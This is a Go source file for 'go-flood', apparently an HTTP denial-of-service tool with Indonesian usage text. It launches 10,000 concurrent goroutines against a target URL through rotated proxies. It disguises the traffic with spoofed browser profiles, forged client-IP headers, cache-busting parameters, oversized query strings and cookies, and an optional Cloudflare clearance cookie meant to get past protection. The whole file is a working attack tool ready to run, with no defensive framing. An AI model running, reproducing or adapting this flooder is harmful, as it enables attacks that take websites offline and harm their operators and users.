package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	wrk        = 2000
	to         = 6 * time.Second
	sub        = 5
	KEEP_ALIVE = 30 * time.Second
)

type BrowserProfile struct {
	UA          string
	Accept      string
	Lang        string
	Encoding    string
	SecChUa     string
	SecChUaMov  string
	SecChUaPlat string
}

var profiles = []BrowserProfile{
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "macOS",
	},
	{
		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?1",
		SecChUaPlat: "Android",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
	{
		UA:          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
	},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}
var PATH_POOL = []string{
	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml",
	"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check",
	"/wp-admin/", "/wp-login.php", "/admin/login", "/admin/panel",
	"/search", "/category/", "/tag/", "/feed/", "/comment/",
	"/user/", "/profile/", "/dashboard", "/settings", "/logout",
	"/login", "/register", "/forgot-password", "/reset-password",
	"/product", "/products", "/category/products", "/shop",
	"/cart", "/checkout", "/payment", "/success", "/cancel",
	"/blog", "/post", "/article", "/news", "/event",
	"/contact", "/about", "/team", "/career", "/faq",
}

type CLI struct {
	client *http.Client
	ip     string
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func RIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

var customCookie string
var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: go-flood <target> [duration] [cookie]")
		fmt.Println("Contoh dengan cookie: go-flood https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		customCookie = os.Args[3]
	}

	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()

	var proxies []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	wcs := make([]CLI, len(proxies))
	for i, proxyURL := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: KEEP_ALIVE,
			}).DialContext,
			DisableKeepAlives:      false,
			MaxIdleConns:           50000,
			MaxIdleConnsPerHost:    50000,
			MaxConnsPerHost:        0,
			IdleConnTimeout:        KEEP_ALIVE,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    false,
			TLSHandshakeTimeout:   5 * time.Second,
			ResponseHeaderTimeout: 5 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		}
		ip := ""
		if proxyURL != nil {
			tr.Proxy = http.ProxyURL(proxyURL)
			ip = proxyURL.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}

	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("ޗ | Method : RDT-FLOOD (GET)\n")
	fmt.Printf("ޗ | Ulimit : 1048576\n")
	fmt.Printf("ޗ | Target : %s\n", tgt)
	fmt.Printf("ޗ | Time   : %d s\n", dur)
	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
	fmt.Printf("ޗ | Conc   : %d (workers) x %d (sub) = %d goroutines\n", wrk, sub, wrk*sub)
	if customCookie != "" {
		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
	} else {
		fmt.Printf("ޗ | Cookie : False\n")
	}
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func(subID int) {
					defer swg.Done()
					subRng := rand.New(rand.NewSource(rng.Int63()))

					for ctx.Err() == nil {
						prof := profiles[subRng.Intn(len(profiles))]

						path := PATH_POOL[subRng.Intn(len(PATH_POOL))]
						reqURL := tgt + path

						reqURL += "?_=" + strconv.FormatInt(subRng.Int63(), 10)

						// Tambahkan parameter acak dengan probabilitas tinggi
						if subRng.Intn(3) != 0 {
							reqURL += "&" + RST(subRng, 6) + "=" + RST(subRng, 10)
						}
						if subRng.Intn(2) == 0 {
							reqURL += "&big=" + strings.Repeat("x", 2048+subRng.Intn(2048))
						}
						if subRng.Intn(5) == 0 {
							reqURL += "&" + RST(subRng, 8) + "=" + strings.Repeat("y", 1024)
						}
						if subRng.Intn(4) == 0 {
							reqURL += "&filter=" + url.QueryEscape(`{"field":"`+RST(subRng, 8)+`","op":"eq","value":"`+RST(subRng, 12)+`"}`)
						}
						if subRng.Intn(3) == 0 {
							reqURL += "&sort=" + RST(subRng, 6) + "&order=" + []string{"asc", "desc"}[subRng.Intn(2)]
						}
						if subRng.Intn(10) == 0 {
							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
						}

						req, _ := http.NewRequest("GET", reqURL, nil)

						req.Header.Set("User-Agent", prof.UA)
						req.Header.Set("Accept", prof.Accept)
						req.Header.Set("Accept-Language", prof.Lang)
						req.Header.Set("Accept-Encoding", prof.Encoding)

						req.Header.Set("Connection", "keep-alive")
						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
						req.Header.Set("Pragma", "no-cache")
						req.Header.Set("Upgrade-Insecure-Requests", "1")
						req.Header.Set("If-Modified-Since", ifModifiedSince)
						req.Header.Set("X-Cache-Buster", strconv.FormatInt(subRng.Int63(), 16))

						if subRng.Intn(3) == 0 {
							req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(subRng.Int63(), 16))
						}
						if subRng.Intn(3) == 0 {
							req.Header.Set("X-Forwarded-Host", strconv.FormatInt(subRng.Int63(), 16)+".example.com")
						}
						if subRng.Intn(3) == 0 {
							req.Header.Set("X-Request-ID", strconv.FormatInt(subRng.Int63(), 16))
						}
						if subRng.Intn(5) == 0 {
							req.Header.Set("X-Real-IP", RIP(subRng))
						}
						if subRng.Intn(5) == 0 {
							req.Header.Set("CF-Connecting-IP", RIP(subRng))
						}
						if subRng.Intn(5) == 0 {
							req.Header.Set("CDN-Loop", "cloudflare")
						}

						var cookies []string
						if customCookie != "" {
							cookies = append(cookies, customCookie)
						}
						for _, name := range COOKIES {
							if subRng.Intn(2) == 0 {
								cookies = append(cookies, name+"="+strconv.FormatInt(subRng.Int63(), 16))
							}
						}
						if subRng.Intn(3) == 0 {
							cookies = append(cookies, "bigcookie="+strings.Repeat("z", 512+subRng.Intn(512)))
						}
						if len(cookies) > 0 {
							req.Header.Set("Cookie", strings.Join(cookies, "; "))
						}

						if subRng.Intn(8) != 0 {
							ref := REF[subRng.Intn(len(REF))]
							req.Header.Set("Referer", ref+host)
						}

						if prof.SecChUa != "" {
							req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
							req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
							req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
						}

						req.Header.Set("Sec-Fetch-Site", "none")
						req.Header.Set("Sec-Fetch-Mode", "navigate")
						req.Header.Set("Sec-Fetch-Dest", "document")

						PID := cli.ip
						if PID == "" {
							PID = RIP(subRng)
						}
						req.Header.Set("X-Forwarded-For", PID)
						req.Header.Set("X-Real-IP", PID)
						req.Header.Set("True-Client-IP", PID)

						resp, err := cli.client.Do(req)
						if err == nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
					}
				}(s)
			}
			swg.Wait()
		}(c, i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()

}
